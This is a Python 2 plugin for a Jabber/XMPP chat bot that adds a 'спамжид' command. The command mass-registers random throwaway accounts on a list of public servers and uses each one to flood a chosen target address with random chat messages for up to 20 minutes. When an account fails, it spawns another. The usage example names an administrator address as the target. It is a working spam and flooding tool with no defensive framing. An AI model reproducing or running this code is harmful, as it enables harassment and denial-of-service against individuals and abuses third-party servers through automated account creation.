#===istalismanplugin===
# -*- coding: utf-8 -*-

import string
import time

from twisted import names
from twisted.internet import protocol, error
from twisted.words.protocols.jabber import client,jid
from twisted.internet.protocol import Protocol, ClientFactory
from twisted.words.protocols.jabber.client import *

SJID_ACTION = 0


def basicClientFactory_(jid, secret):
    a = RegisteringAuthenticator(jid, secret)
    return xmlstream.XmlStreamFactory(a)

class RegisteringAuthenticator(BasicAuthenticator):
    def _registerResultEvent(self, iq):
        if iq["type"] == "result":
            self.streamStarted(self.rootElement)
        else:
            if iq.error['code'] == '500':
                reactor.callLater(5,  self.registerAccount,  self.jid.user,  self.password)
            self.xmlstream.dispatch(iq, self.REGISTER_FAILED_EVENT)
            
    def streamStarted(self, rootElement):
        BasicAuthenticator.streamStarted(self, rootElement)
        self.rootElement = rootElement

class SpamJID(object):
    """ Chuck Norris is watching for you """

    def __init__(self, jid, password, user, reactor=reactor, port=5222, resource="JabberBot"):
        self.jid = jid
	self.password = password
	self.servername = jid[jid.find('@')+1:]
	self.port = port
	self.userjid = user
	self.resource = str(random.randrange(100,999))
	self._jid = None
	self._factory = None
	self._reactor = reactor
	self._resource = None
	self._xmlstream = None
	self.tryandregister = 1
	self.connect()

    def connect(self):
        from twisted.names import client as dns
        d = dns.lookupService('_xmpp-client._tcp.'+self.servername, timeout = [2,10])
        d.addCallback(self._dnsLookup)
        d.addErrback(self._dnsLookupErr)

    def _dnsLookup(self, resp):
        r = random.choice(resp[0])
        self._connect(unicode(r.payload.target), int(r.payload.port))

    def _dnsLookupErr(self, resp):
        self._connect(self.servername, self.port)

    def _connect(self, host, port):
        myJid = jid.JID(self.jid+'/'+self.resource)
        self.factory = basicClientFactory_(myJid, self.password)
        #self.factory.addBootstrap('//event/stream/start',self._streamstart)
        self.factory.addBootstrap('//event/stream/authd',self._authd)
        self.factory.addBootstrap("//event/client/basicauth/invaliduser", self._invaliduser)
        self.factory.addBootstrap("//event/client/basicauth/authfailed", self._authfailed)
        self.factory.addBootstrap("//event/client/basicauth/registerfailed", self._regfailed)
        self.factory.addBootstrap('/iq[@type="result"]/bind', self._bind)
        self.factory.clientConnectionLost = self.connectionLost
        self.factory.clientConnectionFailed = self.connectionFailed
        self.connection = reactor.connectTCP(host,port,self.factory)

    def connectionLost(self, connector, reason=protocol.connectionDone):
        print 'connection lost!'
        star_gen_new_sjid(self.userjid)

    def connectionFailed(self, connector, reason=protocol.connectionDone):
        print 'connection failed!'
        star_gen_new_sjid(self.userjid)

    def _authd(self, el):
        if el:
            self._xmlstream = el
            ##global ff
            ##ff = el
            print u'Registered!'
            try: print self.userjid
            except: pass
            p = domish.Element(('jabber:client', 'presence'))
            p['to'] = self.userjid
            p['type'] = 'subscribe'
            self._reactor.callFromThread(self._xmlstream.send, p)
            threading.Thread(None,self._sender,'sender_'+str(INFO['thr'])).start()

    def _sender(self):
        global SJID_ACTION
        t=time.time()
        while time.time()-t<1200 and SJID_ACTION:
            if not hasattr(self._xmlstream, 'send'):
                break
            message = domish.Element(('jabber:client','message'))
            message["to"] = self.userjid
            message["type"] = 'chat'
            gen = ''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(150))
            message.addElement("body", "jabber:client", gen)
            self._reactor.callFromThread(self._xmlstream.send,message)
        SJID_ACTION = 0
        self._xmlstream.factory.stopTrying()
        self.connection.disconnect()
            

    def _streamEnd(self, el):
        print 'Stream END!'
        star_gen_new_sjid(self.userjid)

    def _bind(self, el):
        pass

    def _authfailed(self, el):
        print el.toXml()
        try: print jid.JID(self.jid).user
        except: pass
        self.factory.authenticator.registerAccount(jid.JID(self.jid).user, self.password)
        print 'trying to register'

    def _invaliduser(self, el):
        print 'invalid user'
        print el.toXml()
        #star_gen_new_sjid(self.userjid)

    def _regfailed(self, el):
        print 'reg failed'
        print el.toXml()
        threading.Thread(None,star_gen_new_sjid,'star_gen_new_sjid'+str(INFO['thr']),(self.userjid,)).start()
    


def hnd_s_jid(t, s, p):
    file = 'dynamic/gogi.txt'
    db_file(file, list)
    if not p:
        reply(t, s, u'Есть коннект с базой! В базе '+str(len(eval(read_file(file))))+u' серверов!')
        return
    global SJID_ACTION
    SJID_ACTION = 1
    n=1
    user=p
    if p.count(' ') and p.split()[1].isdigit() and int(p.split()[1])>0:
        n=int(p.split()[1])
        user = p.split()[0]
    for x in range(n):
        threading.Thread(None,star_gen_new_sjid,'star_gen_new_sjid'+str(INFO['thr']),(user,)).start()
    reply(t, s, u'Okay! Бойтсы пошли!')


def star_gen_new_sjid(user):
    global SJID_ACTION
    if not SJID_ACTION: return
    file = 'dynamic/gogi.txt'
    db=eval(read_file(file))
    if not db or len(db)<2:
        print '\n\nFile ',file,' is Empty! SpamJID stopped!'
    s = random.choice(db)
    n = random.randrange(4, 13)
    passw = ''.join(random.choice(string.ascii_lowercase + string.digits) for x in range(n))
    login = ''.join(random.choice(string.ascii_lowercase + string.digits) for x in range(n))
    try: print login+'@'+s, passw, user
    except: pass
    SpamJID(login+'@'+s, passw, user)

def hnd_s_jid_stop(t, s, p):
    global SJID_ACTION
    SJID_ACTION = 0
    reply(t, s, u'ok')


register_command_handler(hnd_s_jid, 'спамжид', ['все'], 100, '/', 'спамжид <JID> <Thread>', ['спамжид muc_admin@jabber.ru 100'])
register_command_handler(hnd_s_jid_stop, 'спамстоп', ['все'], 10, '/', '/', ['/'])

